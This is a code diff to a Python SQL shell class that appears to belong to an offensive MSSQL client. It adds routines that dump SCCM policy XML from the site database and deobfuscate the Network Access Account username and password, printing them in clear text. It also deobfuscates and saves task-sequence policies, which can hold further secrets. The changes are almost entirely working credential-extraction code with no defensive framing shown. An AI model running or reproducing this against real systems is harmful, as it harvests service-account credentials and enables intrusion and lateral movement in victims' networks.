@@ -31,6 +31,7 @@ import base64
 import shlex
 
 import xml.etree.ElementTree as ET
+from lib.crypto import deobfuscate_credential_string
 
 class SQLSHELL(cmd.Cmd):
     def __init__(self, SQL, show_queries=False, tcpShell=None):
@@ -300,6 +301,7 @@ class SQLSHELL(cmd.Cmd):
             os.mkdir("karen")
             os.mkdir("karen/policyassignments")
             os.mkdir("karen/policies")
+            os.mkdir("karen/deobfuscated")
         try:
             # get the x64 machine guid to request policy assignments // haven't found a reason to grab x86 but you do you if you want to update it
             print("[*] Querying for x64 unknown computer guid")
@@ -318,9 +320,15 @@ class SQLSHELL(cmd.Cmd):
             #saves the xml bodies to a file
             if policies:
                 for policy in policies:
-                    body = policy['Body']     
+                    body = policy['Body']
+                    assignment_id = policy['PolicyAssignmentID']     
                     bytes_data = bytes.fromhex(body.decode('ascii'))
                     decoded_text = bytes_data.decode('utf-16-le')
+                    
+                    #ran into a policy id that had / in it, messed with open()
+                    safe_assignment_id = assignment_id.replace('/', '_')
+                    with open(f"karen/policyassignments/{safe_assignment_id}.xml", 'w') as f:
+                        f.write(decoded_text)
                 
                     ## parse the XML content for the plicy ID and version number
                     root = ET.fromstring(decoded_text)
@@ -344,11 +352,53 @@ class SQLSHELL(cmd.Cmd):
                     decoded_text = decoded_text.lstrip('feff')
                     with open(f"karen/policies/{safe_policy_id}.xml", 'w') as f:
                         f.write(decoded_text)
+                        
+                    
+                    root = ET.fromstring(decoded_text)
+                    for elem in root.iter():
+                        if elem.get('class') == 'CCM_NetworkAccessAccount':
+                            print("[+] Found NAA Policy")
+                            # Process username
+                            for prop in elem.findall(".//*[@name='NetworkAccessUsername']"):
+                                value = prop.find("value")
+                                if value is not None and value.text:
+                                    username = deobfuscate_credential_string(value.text.strip())
+                                    username = username[:username.rfind('\x00')]
+                                    print("[!] Network Access Account Username: '" + username + "'")
+                            
+                            # Process password
+                            for prop in elem.findall(".//*[@name='NetworkAccessPassword']"):
+                                value = prop.find("value")
+                                if value is not None and value.text:
+                                    password = deobfuscate_credential_string(value.text.strip())
+                                    password = password[:password.rfind('\x00')]
+                                    print("[!] Network Access Account Password: '" + password + "'")
+                        if elem.get('name') == 'TS_Sequence':
+                            print("[+] Found Task Sequence policy")
+                            value_elem = elem.find("value")
+                            if value_elem is not None and value_elem.text:
+                                ts_data = value_elem.text.strip()
+                                try:
+                                    ts_sequence = deobfuscate_credential_string(ts_data)
+                                    ts_hash = hashlib.md5(ts_sequence.encode()).hexdigest()
+                                    print("[!] successfully deobfuscated task sequence")
+                                    with open (f"karen/deobfuscated/ts_sequence_{ts_hash}.xml", 'w') as f:
+                                        f.write(ts_sequence)
+                                        print(f"[+] task sequence policy saved to karen/deobfuscated/ts_sequence_{ts_hash}.xml")
+                                    
+                                except Exception as e:
+                                    print(f"[*] Could not deobfuscate Task Sequence: {e}")
+
+                
+                        
+                    
         except Exception as e:
             print(e)
             pass
         except:
             pass
+
+    
     def do_enum_links(self, line):
         self.sql_query("EXEC sp_linkedservers")
         self.print_replies()
